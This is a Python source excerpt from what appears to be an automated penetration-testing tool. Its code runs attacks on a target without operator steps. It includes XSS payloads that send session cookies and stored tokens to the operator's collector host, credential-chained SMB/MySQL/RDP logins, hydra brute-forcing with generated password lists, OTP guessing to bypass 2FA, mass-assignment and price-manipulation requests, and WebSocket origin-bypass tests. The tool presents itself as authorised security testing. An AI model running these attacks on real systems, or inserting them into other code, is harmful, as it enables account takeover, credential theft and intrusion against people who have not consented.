                    f"smbclient //{target}/IPC$ -U '{u}%{pw}' -c 'ls' 2>/dev/null | head -10",
                    target, timeout=15)
                if "Sharename" in out or "blocks" in out:
                    MEMORY.remember_cred(target, "smb", u, pw, verified=True)
                    self._save_findings([{
                        "title": f"Credential Chain → SMB Login: {u}",
                        "severity": "critical",
                        "description": f"SMB login with chained credentials {u}",
                    }], target)
            # MySQL
            if 3306 in port_set:
                out, _ = self._run_cmd("chain-cred-mysql",
                    f"mysql -h {target} -u {u} -p{pw} -e 'show databases;' 2>/dev/null | head -10",
                    target, timeout=12)
                if "Database" in out:
                    self._save_findings([{
                        "title": f"Credential Chain → MySQL Login: {u}",
                        "severity": "high",
                        "description": f"MySQL login with chained credentials {u}",
                    }], target)
            # RDP
            if 3389 in port_set:
                out, _ = self._run_cmd("chain-cred-rdp",
                    f"xfreerdp /u:{u} /p:{pw} /v:{target} /auth-only /cert-ignore 2>/dev/null | tail -3",
                    target, timeout=15)
                if "Authentication only" in out or "successfully" in out.lower():
                    self._save_findings([{
                        "title": f"Credential Chain → RDP Login: {u}",
                        "severity": "critical",
                        "description": f"RDP auth with chained credentials {u}",
                    }], target)

    # ══════════════════════════════════════════════════════════════════════════
    # P1 — XSS Auto-Exploit (cookie stealer beacon)
    # ══════════════════════════════════════════════════════════════════════════
    def _xss_auto_exploit(self, target, open_ports, accumulated_output):
        """P1: Detect XSS, inject beacon, confirm cookie exfiltration."""
        self._log(f"[P1-XSS] Auto-exploit XSS en {target}")
        collector = self.lhost
        col_port = "8888"
        payloads = [
            f"<script>fetch('http://{collector}:{col_port}/xss?c='+encodeURIComponent(document.cookie)+'&h='+location.hostname)</script>",
            f"<img src=x onerror=\"fetch('http://{collector}:{col_port}/xss?c='+btoa(document.cookie))\">",
            f"<svg onload=\"new Image().src='http://{collector}:{col_port}/xss?l='+encodeURIComponent(localStorage.getItem('token')||document.cookie)\">",
            f"'\"><script>document.location='http://{collector}:{col_port}/xss?c='+document.cookie</script>",
            f"<details open ontoggle=fetch('http://{collector}:{col_port}/xss?c='+document.cookie)>",
        ]
        import urllib.parse as _up
        web_ports = [p for p in open_ports if p.get("port") in (80, 443, 8080, 8443, 8000, 3000)]
        for port_info in web_ports[:3]:
            port = port_info["port"]
            scheme = "https" if port in (443, 8443) else "http"
            base_url = f"{scheme}://{target}:{port}"
            # Collect candidate URLs from previous scan output
            all_urls = re.findall(
                rf'{re.escape(scheme)}://{re.escape(target)}(?::\d+)?[^\s"\'<>]*',
                "\n".join(accumulated_output[-15:])
            ) or [base_url + "/"]
            for url in dict.fromkeys(all_urls)[:8]:
                params = re.findall(r'[?&](\w+)=', url) or ["q", "search", "name", "msg", "comment", "s", "id"]
                for param in params[:4]:
                    for payload in payloads[:3]:
                        encoded = _up.quote(payload)
                        if param in url:
                            test_url = re.sub(rf'([?&]{re.escape(param)})=[^&]*', rf'\1={encoded}', url)
                        else:
                            sep = "&" if "?" in url else "?"
                            test_url = f"{url}{sep}{param}={encoded}"
                        reflect_out, _ = self._run_cmd("xss-reflect",
                            f"curl -sk '{test_url}' -L --max-redirs 2 -b 'session=test_cookie_abc123' 2>/dev/null | head -80",
                            target, timeout=12)
                        # Confirmed if our collector hostname or key XSS indicators appear in reflected content
                        if collector in reflect_out or re.search(r'onerror=|onload=|<svg|document\.cookie|fetch\(', reflect_out, re.IGNORECASE):
                            self._save_findings([{
                                "title": f"XSS Reflected — Cookie Exfiltration Beacon: param={param}",
                                "severity": "high",
                                "description": f"Reflected XSS confirmed on {url} param={param}. Payload reflected → attempts cookie beacon to {collector}:{col_port}",
                                "evidence": reflect_out[:400],
                                "remediation": "Encode all user input on output; implement Content-Security-Policy",
                            }], target)
                            self._log(f"[P1-XSS] XSS beacon confirmed: {url}?{param}")
                            break
            # DOM-based XSS via hash
            dom_out, _ = self._run_cmd("xss-dom",
                f"curl -sk '{base_url}/#<img src=x onerror=alert(1)>' 2>/dev/null | grep -i 'onerror\\|eval\\|innerHTML' | head -5",
                target, timeout=10)
            if re.search(r'onerror|eval\(|innerHTML', dom_out, re.IGNORECASE):
                self._save_findings([{
                    "title": "DOM-based XSS — Fragment Reflection",
                    "severity": "medium",
                    "description": f"DOM XSS vector at {base_url}: hash fragment reflected into DOM without sanitisation",
                    "evidence": dom_out[:200],
                }], target)

    # ══════════════════════════════════════════════════════════════════════════
    # P2 — Custom Wordlist Generator (target-specific)
    # ══════════════════════════════════════════════════════════════════════════
    def _custom_wordlist_gen(self, target, open_ports, accumulated_output):
        """P2: Build a target-specific wordlist from OSINT + tech stack."""
        self._log(f"[P2-WL] Generando wordlist personalizada para {target}")
        combined = "\n".join(accumulated_output)
        words: set = set()
        # Seed from target name/domain
        for part in re.split(r'[\.\-_]', target):
            if len(part) > 2:
                words.add(part.lower())
        # Extract person names from HTTP/HTML/cert
        for name_m in re.finditer(r'\b([A-Z][a-z]{2,12})\s+([A-Z][a-z]{2,12})\b', combined):
            first, last = name_m.group(1).lower(), name_m.group(2).lower()
            words.update([first, last, f"{first}{last}", f"{first}.{last}",
                          f"{first[0]}{last}", f"{last}{first[0]}"])
        # Extract from SSL cert CN/O
        for cert_m in re.finditer(r'(?:CN|O|OU)\s*=\s*([^\s,/\\]+)', combined):
            for part in re.split(r'[\.\-_\s]', cert_m.group(1)):
                if len(part) > 2:
                    words.add(part.lower())
        # Page titles
        for port_info in open_ports[:4]:
            port = port_info.get("port", 80)
            if port in (80, 443, 8080, 8443):
                scheme = "https" if port in (443, 8443) else "http"
                title_out, _ = self._run_cmd("wl-title",
                    f"curl -sk {scheme}://{target}:{port}/ 2>/dev/null | grep -oP '(?<=<title>)[^<]+' | head -3",
                    target, timeout=10)
                for w in re.split(r'\W+', title_out):
                    if len(w) > 3:
                        words.add(w.lower())
        # Build permutations
        base_words = sorted(words)[:30]
        patterns: list = []
        current_year = 2026
        for w in base_words:
            patterns.extend([
                w, w.capitalize(), w.upper(),
                f"{w}1", f"{w}123", f"{w}!", f"{w}@",
                f"{w}{current_year}", f"{w}{current_year}!", f"{w}2025", f"{w}2024",
                f"{w.capitalize()}1", f"{w.capitalize()}123!", f"{w.capitalize()}@{current_year}",
            ])
        for season in ["Spring", "Summer", "Fall", "Winter"]:
            patterns.extend([
                f"{season}{current_year}!", f"{season}{current_year-1}!",
                f"{target.split('.')[0].capitalize()}{season}{current_year}",
            ])
        patterns.extend([
            "Password1", "P@ssw0rd", "Admin123!", "Welcome1!", "Changeme1",
            "password", "admin", "root", "toor", "letmein", "qwerty123",
            "abc123", "dragon", "monkey", "111111", "123456789", "iloveyou",
            f"{target.split('.')[0].capitalize()}123!",
        ])
        wl_path = f"/tmp/custom_wl_{target.replace('.','_')}.txt"
        uniq = list(dict.fromkeys(patterns))[:6000]
        try:
            with open(wl_path, 'w') as wf:
                wf.write("\n".join(uniq))
            self._log(f"[P2-WL] {len(uniq)} palabras → {wl_path}")
            accumulated_output.append(f"=== CUSTOM WORDLIST ===\nPath: {wl_path}\nTotal: {len(uniq)}\nSample: {', '.join(uniq[:10])}")
            # Store path for other methods
            self._custom_wl_path = wl_path
            # Auto-use on SSH
            port_set = {p["port"] for p in open_ports}
            if 22 in port_set:
                hyd, _ = self._run_cmd("wl-hydra-ssh",
                    f"hydra -L {wl_path} -P {wl_path} -t 4 -f -q ssh://{target} 2>/dev/null | grep '\\[22\\]' | head -5",
                    target, timeout=150)
                if "login:" in hyd:
                    m = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', hyd)
                    if m:
                        u, pw = m.group(1), m.group(2)
                        MEMORY.remember_cred(target, "ssh", u, pw, verified=True)
                        self._save_findings([{
                            "title": f"SSH Credentials — Custom Wordlist Attack: {u}",
                            "severity": "critical",
                            "description": f"Target-specific wordlist succeeded SSH brute-force: {u}",
                        }], target)
            # Auto-use on HTTP basic auth / login forms
            web_ports_local = [p for p in open_ports if p.get("port") in (80, 443, 8080, 8443)]
            for wp in web_ports_local[:2]:
                port = wp["port"]
                scheme = "https" if port in (443, 8443) else "http"
                hyd2, _ = self._run_cmd("wl-hydra-http",
                    f"hydra -L {wl_path} -P {wl_path} -t 4 -f -q "
                    f"http-get://{target}:{port}/ 2>/dev/null | grep '\\[{port}\\]' | head -3",
                    target, timeout=90)
                if "login:" in hyd2:
                    m2 = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', hyd2)
                    if m2:
                        self._save_findings([{
                            "title": f"HTTP Basic Auth Bypass — Custom Wordlist: {m2.group(1)}",
                            "severity": "critical",
                            "description": f"HTTP basic auth cracked with custom wordlist: {m2.group(1)}",
                        }], target)
        except Exception as exc:
            self._log(f"[P2-WL] Error: {exc}")

    # ══════════════════════════════════════════════════════════════════════════
    # P3 — Nuclei Template Auto-Generator
    # ══════════════════════════════════════════════════════════════════════════
    def _nuclei_template_gen(self, target, open_ports, accumulated_output):
        """P3: Auto-generate Nuclei templates from detected tech/endpoints."""
        self._log(f"[P3-NTG] Generando templates Nuclei para {target}")
        combined = "\n".join(accumulated_output[-20:])
        tdir = f"/tmp/custom_nuclei_{target.replace('.','_')}"
        os.makedirs(tdir, exist_ok=True)
        generated = []

        # Template 1: version-specific for each detected service
        for soft, ver in re.findall(r'([\w\-]{3,20})/([\d]+\.[\d]+(?:\.[\d]+)?)', combined)[:12]:
            tpl_id = f"custom-{soft.lower()}-{ver.replace('.', '-')}-version"
            tpl_body = f"""id: {tpl_id}
info:
  name: "{soft} {ver} Version Exposure"
  author: pentsuite-autopilot
  severity: info
  description: Detected {soft}/{ver} — check for known CVEs

http:
  - method: GET
    path:
      - "{{{{BaseURL}}}}/"
    matchers:
      - type: word
        words:
          - "{soft}/{ver}"
          - "{soft} {ver}"
        condition: or
        part: response
"""
            tpl_path = f"{tdir}/{tpl_id}.yaml"
            try:
                with open(tpl_path, 'w') as tf:
                    tf.write(tpl_body)
                generated.append(tpl_path)
            except Exception:
                pass

        # Template 2: exposed paths found during scans
        found_paths = re.findall(r'(?:GET|POST|Found|200)\s+(/[^\s\?"\']{3,60})', combined)
        for path in list(dict.fromkeys(found_paths))[:15]:
            safe = re.sub(r'[^a-z0-9\-]', '-', path.lower())[:40].strip('-')
            tpl_id = f"custom-path-{safe}"
            tpl_body = f"""id: {tpl_id}
info:
  name: "Discovered Path: {path}"
  author: pentsuite-autopilot
  severity: info

http:
  - method: GET
    path:
      - "{{{{BaseURL}}}}{path}"
    matchers:
      - type: status
        status: [200, 301, 302]
"""
            tpl_path = f"{tdir}/{tpl_id}.yaml"
            try:
                with open(tpl_path, 'w') as tf:
                    tf.write(tpl_body)
                generated.append(tpl_path)
            except Exception:
                pass

        if not generated:
            return

        self._log(f"[P3-NTG] {len(generated)} templates generados → {tdir}")
        # Run nuclei with custom templates
        out, _ = self._run_cmd("nuclei-custom-tpl",
            f"nuclei -u http://{target} -t {tdir} -silent -j 2>/dev/null | head -60",
            target, timeout=90)
        accumulated_output.append(f"=== NUCLEI CUSTOM TEMPLATES ({len(generated)}) ===\n{out[:1200]}")
        for line in out.strip().splitlines()[:15]:
            try:
                result = json.loads(line)
                sev = result.get("info", {}).get("severity", result.get("severity", "info"))
                self._save_findings([{
                    "title": f"Nuclei Custom: {result.get('template-id', result.get('templateID', 'unknown'))}",
                    "severity": sev if sev in ("critical","high","medium","low","info") else "info",
                    "description": f"Custom template match at {result.get('matched-at', result.get('host', ''))}",
                }], target)
            except Exception:
                pass

    # ══════════════════════════════════════════════════════════════════════════
    # P4 — Business Logic Testing
    # ══════════════════════════════════════════════════════════════════════════
    def _business_logic_test(self, target, open_ports, accumulated_output):
        """P4: Price manipulation, negative qty, workflow bypass, IDOR mass enum, response manipulation."""
        self._log(f"[P4-BL] Business logic testing en {target}")
        web_ports = [p for p in open_ports if p.get("port") in (80, 443, 8080, 8443, 3000, 4000, 8000)]
        if not web_ports:
            return
        for port_info in web_ports[:2]:
            port = port_info["port"]
            scheme = "https" if port in (443, 8443) else "http"
            base_url = f"{scheme}://{target}:{port}"

            # BL1: Negative quantity / price override
            cart_eps = ["/cart", "/api/cart", "/checkout", "/order", "/api/order",
                        "/shop/cart", "/basket", "/api/basket", "/api/products/buy"]
            for ep in cart_eps:
                for payload, label in [
                    ('{"quantity":-1,"price":0.01,"item_id":1}', "negative-qty"),
                    ('{"quantity":1,"price":0,"unit_price":0,"item_id":1}', "price-zero"),
                    ('{"quantity":99999,"price":0.001,"item_id":1}', "overflow-qty"),
                ]:
                    out, _ = self._run_cmd(f"bl-{label}",
                        f"curl -sk -X POST {base_url}{ep} -H 'Content-Type: application/json' "
                        f"-d '{payload}' 2>/dev/null | head -15",
                        target, timeout=10)
                    if re.search(r'"total":\s*-|"amount":\s*-|"price":\s*0[,}]|credit|refund', out, re.IGNORECASE):
                        self._save_findings([{
                            "title": f"Business Logic — {label.replace('-',' ').title()} at {ep}",
                            "severity": "high",
                            "description": f"Endpoint {base_url}{ep} accepts {label}: {payload[:100]}. Response: {out[:200]}",
                            "remediation": "Validate quantity/price server-side; reject negative or zero values",
                        }], target)

            # BL2: IDOR mass enumeration from discovered numeric IDs
            id_urls = re.findall(
                r'(https?://[^"\s]+(?:/(?:user|account|order|invoice|ticket|document|file)s?/)(\d+))',
                "\n".join(accumulated_output[-10:])
            )
            if id_urls:
                base_id_url, base_id_num = id_urls[0]
                base_id = int(base_id_num)
                base_pattern = re.sub(r'/\d+$', '/', base_id_url)
                idor_ok = []
                for test_id in range(max(1, base_id - 5), base_id + 25):
                    out, _ = self._run_cmd("bl-idor",
                        f"curl -sk -o /dev/null -w '%{{http_code}}' {base_pattern}{test_id} 2>/dev/null",
                        target, timeout=6)
                    if out.strip() == "200":
                        idor_ok.append(test_id)
                if len(idor_ok) > 3:
                    self._save_findings([{
                        "title": f"IDOR — Mass Object Enumeration ({len(idor_ok)} objects)",
                        "severity": "high",
                        "description": f"Sequential IDs accessible without auth check at {base_pattern}: {idor_ok[:10]}",
                        "remediation": "Use non-sequential UUIDs; enforce object-level authorisation on every request",
                    }], target)

            # BL3: Workflow step bypass (skip prerequisite steps)
            workflow_pairs = [
                ("/checkout/confirm", "/checkout/payment"),
                ("/api/order/complete", "/api/order/init"),
                ("/payment/success", "/payment/process"),
                ("/admin/dashboard", "/admin/login"),
                ("/profile/change-email", "/profile/verify-password"),
                ("/2fa/disable", "/2fa/verify"),
            ]
            for target_ep, prereq_ep in workflow_pairs:
                sc_out, _ = self._run_cmd("bl-workflow-skip",
                    f"curl -sk -o /dev/null -w '%{{http_code}}' {base_url}{target_ep} 2>/dev/null",
                    target, timeout=8)
                if sc_out.strip() in ("200", "302"):
                    content_out, _ = self._run_cmd("bl-workflow-content",
                        f"curl -sk {base_url}{target_ep} 2>/dev/null | head -20",
                        target, timeout=8)
                    if not re.search(r'redirect|login|unauthori|403|401|forbidden', content_out, re.IGNORECASE):
                        self._save_findings([{
                            "title": f"Business Logic — Workflow Bypass: {target_ep}",
                            "severity": "medium",
                            "description": f"Step {target_ep} reachable without completing {prereq_ep}. Content: {content_out[:150]}",
                            "remediation": "Implement server-side state machine; validate workflow step completion before each action",
                        }], target)

            # BL4: Response manipulation vector detection
            auth_eps = ["/login", "/api/login", "/auth", "/signin", "/api/auth/login", "/api/authenticate"]
            for ep in auth_eps:
                out, _ = self._run_cmd("bl-resp-manip",
                    f"curl -sk -X POST {base_url}{ep} -H 'Content-Type: application/json' "
                    f"-d '{{\"username\":\"admin\",\"password\":\"wrongpassword\"}}' 2>/dev/null | head -5",
                    target, timeout=10)
                if re.search(r'"(?:success|authenticated|valid|login)"\s*:\s*false', out, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"Business Logic — Auth Response Manipulation Vector: {ep}",
                        "severity": "medium",
                        "description": f"Auth endpoint {base_url}{ep} returns boolean result in response body — interceptable by MITM proxy to flip false→true. Response: {out[:200]}",
                        "remediation": "Never include auth outcome in response body; use HTTP status codes and server-side sessions only",
                    }], target)

            # BL5: Mass assignment (send extra privileged fields)
            priv_payloads = [
                '{"username":"test","password":"test","role":"admin","isAdmin":true}',
                '{"email":"test@x.com","password":"test","verified":true,"subscription":"pro"}',
                '{"name":"test","admin":1,"is_staff":true,"is_superuser":true}',
            ]
            reg_eps = ["/register", "/api/register", "/signup", "/api/signup", "/api/users"]
            for ep in reg_eps:
                for pl in priv_payloads[:2]:
                    out, _ = self._run_cmd("bl-mass-assign",
                        f"curl -sk -X POST {base_url}{ep} -H 'Content-Type: application/json' "
                        f"-d '{pl}' 2>/dev/null | head -10",
                        target, timeout=10)
                    if re.search(r'"(?:success|created|id|userId)"\s*:', out, re.IGNORECASE):
                        self._save_findings([{
                            "title": f"Business Logic — Mass Assignment: {ep}",
                            "severity": "high",
                            "description": f"Registration endpoint {base_url}{ep} may accept privileged fields (role/isAdmin). Payload: {pl[:100]}",
                            "remediation": "Whitelist allowed fields server-side; never bind request body directly to DB model",
                        }], target)

    # ══════════════════════════════════════════════════════════════════════════
    # P5 — WebSocket Security Testing
    # ══════════════════════════════════════════════════════════════════════════
    def _websocket_security(self, target, open_ports, accumulated_output):
        """P5: WS upgrade, origin bypass, message injection, unauthenticated endpoints."""
        self._log(f"[P5-WS] WebSocket security testing en {target}")
        web_ports = [p for p in open_ports if p.get("port") in (80, 443, 8080, 8443, 3000, 4000, 6789, 9090)]
        if not web_ports:
            return
        for port_info in web_ports[:3]:
            port = port_info["port"]
            scheme = "https" if port in (443, 8443) else "http"
            ws_scheme = "wss" if port in (443, 8443) else "ws"
            base_url = f"{scheme}://{target}:{port}"
            # Detect WS paths from page source
            src_out, _ = self._run_cmd("ws-discover",
                f"curl -sk {base_url}/ 2>/dev/null | grep -oE '[\"\\'](/ws[^\"\\']*|/socket[^\"\\']*|/chat[^\"\\']*|/live[^\"\\']*|socket\\.io[^\"\\']*)[\"\\']' | tr -d '\"\\'\\'' | sort -u | head -10",
                target, timeout=12)
            ws_paths = re.findall(r'(/\S+)', src_out) or ["/ws", "/websocket", "/socket.io/", "/chat", "/live"]
            for ws_path in ws_paths[:4]:
                ws_url = f"{ws_scheme}://{target}:{port}{ws_path}"
                # P5a: Test unauthenticated WS connect with cross-origin
                ws_script = (
                    "import sys, json\n"
                    "try:\n"
                    "    import websocket\n"
                    f"    ws = websocket.create_connection('{ws_url}', timeout=6,\n"
                    f"        header=['Origin: http://evil.com'])\n"
                    "    ws.send(json.dumps({'type':'ping','data':'test'}))\n"
                    "    res = ws.recv()\n"
                    "    print('WS_OK:' + str(res)[:200])\n"
                    f"    ws.send(json.dumps({{'type':'subscribe','channel':'admin','role':'administrator'}}))\n"
                    "    res2 = ws.recv()\n"
                    "    print('WS_PRIV:' + str(res2)[:200])\n"
                    "    ws.close()\n"
                    "except Exception as e:\n"
                    "    print('WS_ERR:' + str(e))\n"
                )
                with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, dir='/tmp') as tf:
                    tf.write(ws_script)
                    sp = tf.name
                out, _ = self._run_cmd("ws-connect", f"timeout 15 python3 {sp} 2>/dev/null", target, timeout=20)
                try:
                    os.unlink(sp)
                except Exception:
                    pass
                if "WS_OK:" in out:
                    self._save_findings([{
                        "title": f"WebSocket — Unauthenticated Connection Accepted: {ws_path}",
                        "severity": "medium",
                        "description": f"WS at {ws_url} accepts connections from evil.com origin without auth. Response: {out[:300]}",
                        "remediation": "Validate Origin header; require JWT/session token on WS handshake",
                    }], target)
                    if "WS_PRIV:" in out and "error" not in out[out.find("WS_PRIV:"):].lower():
                        self._save_findings([{
                            "title": f"WebSocket — Privilege Escalation via Message Injection: {ws_path}",
                            "severity": "high",
                            "description": f"WS at {ws_url} accepted role=administrator subscription without auth",
                        }], target)
                # P5b: CSRF via WebSocket (missing Origin validation via raw HTTP upgrade)
                csrf_out, _ = self._run_cmd("ws-csrf-upgrade",
                    f"curl -sk -D - -H 'Upgrade: websocket' -H 'Connection: Upgrade' "
                    f"-H 'Origin: http://evil.com' "
                    f"-H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' "
                    f"-H 'Sec-WebSocket-Version: 13' "
                    f"{base_url}{ws_path} 2>/dev/null | head -10",
                    target, timeout=10)
                if re.search(r'101|Switching Protocols', csrf_out, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"WebSocket — Missing Origin Validation (CSRF via WS)",
                        "severity": "high",
                        "description": f"WS upgrade at {ws_url} accepted cross-origin request (Origin: evil.com) without CSRF protection",
                        "remediation": "Validate Origin header server-side on every WebSocket upgrade",
                    }], target)
                # P5c: Message injection payloads
                for inj_payload in [
                    '{"__proto__":{"isAdmin":true},"type":"auth"}',
                    '{"type":"message","content":"<script>alert(1)</script>"}',
                    '{"type":"sql","query":"SELECT 1 UNION SELECT password FROM users--"}',
                ]:
                    inj_script = (
                        "try:\n"
                        "    import websocket, json\n"
                        f"    ws = websocket.create_connection('{ws_url}', timeout=5)\n"
                        f"    ws.send('{inj_payload}')\n"
                        "    res = ws.recv()\n"
                        "    print('WS_INJ:' + str(res)[:200])\n"
                        "    ws.close()\n"
                        "except Exception as e: print('ERR:'+str(e))\n"
                    )
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, dir='/tmp') as tf:
                        tf.write(inj_script)
                        sp2 = tf.name
                    out2, _ = self._run_cmd("ws-inject", f"timeout 10 python3 {sp2} 2>/dev/null", target, timeout=14)
                    try:
                        os.unlink(sp2)
                    except Exception:
                        pass
                    if "WS_INJ:" in out2 and "ERR:" not in out2:
                        self._save_findings([{
                            "title": "WebSocket — Arbitrary Message Injection Accepted",
                            "severity": "medium",
                            "description": f"WS at {ws_url} processed injected payload: {inj_payload[:100]}. Response: {out2[7:][:200]}",
                        }], target)

    # ══════════════════════════════════════════════════════════════════════════
    # P6 — 2FA/MFA Bypass
    # ══════════════════════════════════════════════════════════════════════════
    def _mfa_bypass(self, target, open_ports, accumulated_output):
        """P6: OTP brute force, backup code exposure, response manipulation, reuse window."""
        self._log(f"[P6-MFA] 2FA/MFA bypass testing en {target}")
        web_ports = [p for p in open_ports if p.get("port") in (80, 443, 8080, 8443, 3000)]
        if not web_ports:
            return
        for port_info in web_ports[:2]:
            port = port_info["port"]
            scheme = "https" if port in (443, 8443) else "http"
            base_url = f"{scheme}://{target}:{port}"
            mfa_paths = ["/2fa", "/mfa", "/otp", "/verify", "/api/2fa", "/api/mfa",
                         "/auth/2fa", "/login/verify", "/account/2fa", "/totp", "/api/otp/verify"]
            for mfa_path in mfa_paths:
                sc, _ = self._run_cmd("mfa-probe",
                    f"curl -sk -o /dev/null -w '%{{http_code}}' {base_url}{mfa_path} 2>/dev/null",
                    target, timeout=8)
                if sc.strip() not in ("200", "400", "302", "401"):
                    continue
                self._log(f"[P6-MFA] 2FA endpoint detectado: {base_url}{mfa_path}")
                cookie_jar = f"/tmp/mfa_jar_{target.replace('.','_')}.txt"
                found_vuln = False

                # P6a: Common/weak OTPs
                weak_otps = ["000000", "111111", "123456", "654321", "999999",
                             "000001", "123123", "112233", "696969", "121212", "000000"]
                for otp in weak_otps:
                    otp_out, _ = self._run_cmd("mfa-otp",
                        f"curl -sk -X POST {base_url}{mfa_path} "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"otp\":\"{otp}\",\"code\":\"{otp}\",\"token\":\"{otp}\"}}' "
                        f"-c {cookie_jar} -b {cookie_jar} 2>/dev/null | head -8",
                        target, timeout=10)
                    if re.search(r'"(?:success|authenticated|valid|verified)"\s*:\s*true', otp_out, re.IGNORECASE):
                        self._save_findings([{
                            "title": f"2FA Bypass — Weak OTP Accepted: {otp}",
                            "severity": "critical",
                            "description": f"2FA at {base_url}{mfa_path} accepted common OTP {otp}",
                            "remediation": "Use cryptographically random TOTP; rate-limit and lockout after 5 attempts",
                        }], target)
                        found_vuln = True
                        break

                # P6b: Response manipulation vector
                otp_test, _ = self._run_cmd("mfa-resp-check",
                    f"curl -sk -X POST {base_url}{mfa_path} "
                    f"-H 'Content-Type: application/json' "
                    f"-d '{{\"otp\":\"999999\"}}' 2>/dev/null | head -5",
                    target, timeout=10)
                if re.search(r'"(?:success|valid|authenticated)"\s*:\s*false', otp_test, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"2FA — Response Manipulation Vector at {mfa_path}",
                        "severity": "high",
                        "description": f"2FA endpoint {base_url}{mfa_path} returns boolean auth result in body — intercept and flip false→true with proxy",
                        "evidence": otp_test[:200],
                        "remediation": "Use HTTP status codes for auth results; never expose boolean success in body",
                    }], target)

                # P6c: Backup codes exposure
                backup_paths = ["/backup-codes", "/recovery-codes", "/api/backup-codes",
                                "/account/recovery", "/2fa/backup", "/mfa/recovery"]
                for bp in backup_paths:
                    bp_out, _ = self._run_cmd("mfa-backup",
                        f"curl -sk {base_url}{bp} -c {cookie_jar} -b {cookie_jar} 2>/dev/null | head -15",
                        target, timeout=8)
                    if re.search(r'\b[A-Z0-9]{4}[-\s][A-Z0-9]{4}\b|\b\d{8}\b', bp_out):
                        self._save_findings([{
                            "title": f"2FA Backup Codes Exposed at {bp}",
                            "severity": "critical",
                            "description": f"Backup/recovery codes accessible without re-auth at {base_url}{bp}: {bp_out[:200]}",
                            "remediation": "Require full re-authentication before displaying or regenerating backup codes",
                        }], target)

                # P6d: Rate-limit bypass (no lockout)
                attempts = 0
                for dummy_otp in ["000001", "000002", "000003", "000004", "000005", "000006"]:
                    sc2, _ = self._run_cmd("mfa-rate",
                        f"curl -sk -o /dev/null -w '%{{http_code}}' -X POST {base_url}{mfa_path} "
                        f"-H 'Content-Type: application/json' -d '{{\"otp\":\"{dummy_otp}\"}}' 2>/dev/null",
                        target, timeout=8)
                    if sc2.strip() not in ("429", "423", "403"):
                        attempts += 1
                    else:
                        break
                if attempts >= 6:
                    self._save_findings([{
                        "title": f"2FA — No Rate Limiting / Account Lockout on OTP Endpoint",
                        "severity": "high",
                        "description": f"OTP endpoint {base_url}{mfa_path} allows at least 6 attempts without lockout or rate-limiting",
                        "remediation": "Implement exponential backoff lockout (5 failures → 30 min lock); add CAPTCHA",
                    }], target)
                break  # one mfa_path per port

    # ══════════════════════════════════════════════════════════════════════════
    # S4 — Replay PoC Generator
    # ══════════════════════════════════════════════════════════════════════════
    def _generate_replay_poc(self, target, accumulated_output):
        """S4: Build Python + Bash PoC scripts from all successful attack steps."""
        self._log(f"[S4-POC] Generando scripts de replay PoC para {target}")
        combined = "\n".join(accumulated_output)
        # Gather all curl commands executed
        curl_cmds = re.findall(r"curl\s+(?:-\S+\s+)*(?:'[^']+'|\"[^\"]+\"|https?://\S+)", combined)

        py_lines = [
            "#!/usr/bin/env python3",
            '"""',
            f"PentSuite Autopilot — Attack Replay PoC",
            f"Target: {target}",
            f"Generated: {datetime.now().isoformat()}",
            "WARNING: Authorised use only.",
            '"""',
            "import requests, urllib3",
            "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)",
            "",
            f"TARGET = '{target}'",
            "s = requests.Session()",
            "s.verify = False",
            "",
        ]
        bash_lines = [
            "#!/bin/bash",
            f"# PentSuite Autopilot — Curl Replay",
            f"# Target: {target}",
            f"# {datetime.now().isoformat()}",
            f"TARGET={target}", "",
        ]
        for i, curl_cmd in enumerate(curl_cmds[:15], 1):
            url_m = re.search(r"https?://\S+", curl_cmd)
            method_m = re.search(r"-X\s+(\w+)", curl_cmd)
            data_m = re.search(r"(?:-d|--data)\s+'([^']+)'", curl_cmd)
            headers = {h.split(":",1)[0].strip(): h.split(":",1)[1].strip()
                       for h in re.findall(r"-H\s+'([^']+)'", curl_cmd) if ":" in h}
            url = url_m.group(0) if url_m else ""
            method = (method_m.group(1) if method_m else "GET").lower()
            data = data_m.group(1) if data_m else None
            if not url:
                continue
            py_lines += [
                f"# Step {i}",
                f"r{i} = s.{method}(",
                f"    '{url}',",
            ]
            if headers:
                py_lines.append(f"    headers={json.dumps(headers)},")
            if data:
                py_lines.append(f"    data='{data}',")
            py_lines += [f"    timeout=20,)", f"print(f'[{i}] {{r{i}.status_code}} {{r{i}.text[:100]}}')", ""]
            bash_lines += [f"# Step {i}", curl_cmd.replace(target, "$TARGET"), ""]

        # MSF commands found
        msf_cmds = re.findall(r"msfconsole[^\n]{20,200}", combined)
        for i, msf in enumerate(msf_cmds[:5], 1):
            bash_lines += [f"# MSF-{i}", f"# {msf[:200]}", ""]

        python_poc = "\n".join(py_lines)
        bash_poc = "\n".join(bash_lines)
        with self._project_lock:
            proj = read_project(self.project_id)
            if proj:
                proj.setdefault("replay_pocs", []).append({
                    "target": target,
                    "generated_at": datetime.now().isoformat(),
                    "python_poc": python_poc,
                    "bash_poc": bash_poc,
                    "steps_captured": len(curl_cmds),
                })
                write_project(proj)
        self._log(f"[S4-POC] PoC guardado — {len(curl_cmds)} pasos capturados")

    # ══════════════════════════════════════════════════════════════════════════
    # S5 — Attack Surface Score
    # ══════════════════════════════════════════════════════════════════════════
    def _attack_surface_score(self, target, open_ports, accumulated_output):
        """S5: Compute and persist a numeric attack surface score (0–100)."""
        self._log(f"[S5-ASS] Calculando attack surface score para {target}")
        with self._project_lock:
            proj = read_project(self.project_id)
            findings = proj.get("findings", []) if proj else []

        port_count = len(open_ports)
        svc_diversity = len({p.get("service", "?") for p in open_ports})
        sev_w = {"critical": 10, "high": 7, "medium": 4, "low": 1, "info": 0}
        finding_score = sum(sev_w.get(f.get("severity","info"), 0) for f in findings)
        web_count = sum(1 for p in open_ports if p.get("port") in (80,443,8080,8443,3000,4000))
        risky_svcs = ["telnet","ftp","redis","mongodb","elasticsearch","docker","vnc","rdp","rsync","nfs","rpc"]
        risky_count = sum(1 for p in open_ports if any(rs in p.get("service","").lower() for rs in risky_svcs))
        raw = min(100.0, (
            port_count * 0.5 +
            svc_diversity * 1.2 +
            finding_score * 0.4 +
            risky_count * 3.5 +
            web_count * 2.0
        ))
